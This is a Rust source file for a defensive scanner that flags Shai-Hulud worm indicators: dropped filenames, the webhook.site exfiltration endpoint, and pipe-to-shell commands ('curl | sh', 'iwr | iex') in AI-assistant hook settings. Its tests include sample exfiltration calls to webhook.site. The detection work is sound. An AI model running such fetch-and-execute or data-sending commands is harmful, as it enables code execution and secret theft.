use anyhow::Result;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

// Indicators of compromise (filenames) seen across Shai-Hulud / Mini Shai-Hulud reports.
// Sources: Snyk, StepSecurity, Unit42, Microsoft Security Blog (2026-05).
const IOC_FILENAMES: &[&str] = &[
    "router_runtime.js",
    "setup.mjs",
    "shai-hulud.json",
    "shai-hulud-workflow.yml",
    "bun_environment.js",
    "processor.js",
];

const SKIP_DIRS: &[&str] = &["node_modules", "target", ".git"];

// Content indicators of secret exfiltration, applied to repo files the worm
// tends to drop (CI workflows, helper scripts). `webhook.site` is a documented
// Shai-Hulud exfil endpoint. Kept deliberately tiny — precision over recall, so
// a hit is worth a human's attention rather than noise.
const EXFIL_INDICATORS: &[&str] = &["webhook.site"];

// Only read files that plausibly carry a dropped payload. Skips lockfiles,
// binaries, and large generated bundles.
const CARRIER_EXTS: &[&str] = &["js", "cjs", "mjs", "ts", "yml", "yaml", "sh", "ps1"];
const MAX_SCAN_BYTES: u64 = 2_000_000;

pub fn scan_ioc_files(root: &Path) -> Result<Vec<PathBuf>> {
    let mut found = Vec::new();
    let walker = WalkDir::new(root).into_iter().filter_entry(|e| {
        if !e.file_type().is_dir() {
            return true;
        }
        let n = e.file_name().to_string_lossy();
        !SKIP_DIRS.iter().any(|s| *s == n)
    });
    for entry in walker.filter_map(|e| e.ok()) {
        if !entry.file_type().is_file() {
            continue;
        }
        let name = entry.file_name().to_string_lossy();
        if IOC_FILENAMES.iter().any(|ioc| *ioc == name) {
            found.push(entry.into_path());
        }
    }
    Ok(found)
}

// Scans the same repo files (node_modules excluded) for known exfil endpoints
// in their content. Requires no installed dependencies — it targets artifacts
// the worm writes into the repo, not the dependency tree.
pub fn scan_exfil_indicators(root: &Path) -> Result<Vec<(PathBuf, String)>> {
    let mut found = Vec::new();
    let walker = WalkDir::new(root).into_iter().filter_entry(|e| {
        if !e.file_type().is_dir() {
            return true;
        }
        let n = e.file_name().to_string_lossy();
        !SKIP_DIRS.iter().any(|s| *s == n)
    });
    for entry in walker.filter_map(|e| e.ok()) {
        if !entry.file_type().is_file() {
            continue;
        }
        let path = entry.path();
        let ext = path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("")
            .to_lowercase();
        if !CARRIER_EXTS.iter().any(|c| *c == ext) {
            continue;
        }
        if entry.metadata().map(|m| m.len()).unwrap_or(u64::MAX) > MAX_SCAN_BYTES {
            continue;
        }
        let Ok(text) = std::fs::read_to_string(path) else {
            continue;
        };
        if let Some(ind) = content_indicator(&text) {
            found.push((entry.into_path(), ind.to_string()));
        }
    }
    Ok(found)
}

fn content_indicator(text: &str) -> Option<&'static str> {
    let lowered = text.to_lowercase();
    EXFIL_INDICATORS
        .iter()
        .copied()
        .find(|ind| lowered.contains(*ind))
}

pub fn scan_claude_hooks() -> Result<Vec<String>> {
    let home = match std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")) {
        Ok(h) => PathBuf::from(h),
        Err(_) => return Ok(Vec::new()),
    };
    let settings = home.join(".claude").join("settings.json");
    if !settings.exists() {
        return Ok(Vec::new());
    }

    let body = std::fs::read_to_string(&settings)?;
    let v: serde_json::Value = match serde_json::from_str(&body) {
        Ok(v) => v,
        Err(_) => return Ok(vec!["~/.claude/settings.json is not valid JSON".into()]),
    };

    let mut suspicious = Vec::new();
    if let Some(hooks) = v.get("hooks") {
        let serialized = hooks.to_string();
        for ioc in IOC_FILENAMES {
            if serialized.contains(ioc) {
                suspicious.push(format!("hooks reference IOC file: {ioc}"));
            }
        }
        let lowered = serialized.to_lowercase();
        if lowered.contains("curl ")
            && (lowered.contains("| sh") || lowered.contains("|sh") || lowered.contains("| bash"))
        {
            suspicious.push("hooks contain a `curl | sh` style command".into());
        }
        if lowered.contains("iwr ") && lowered.contains("iex") {
            suspicious.push("hooks contain a `iwr ... | iex` style command".into());
        }
    }
    Ok(suspicious)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn content_indicator_matches_known_endpoint() {
        assert_eq!(
            content_indicator("fetch('https://webhook.site/abc-123', {method:'POST'})"),
            Some("webhook.site")
        );
        // case-insensitive
        assert_eq!(
            content_indicator("curl https://WEBHOOK.SITE/x"),
            Some("webhook.site")
        );
    }

    #[test]
    fn content_indicator_ignores_clean_code() {
        assert_eq!(content_indicator("const x = require('lodash')"), None);
    }
}
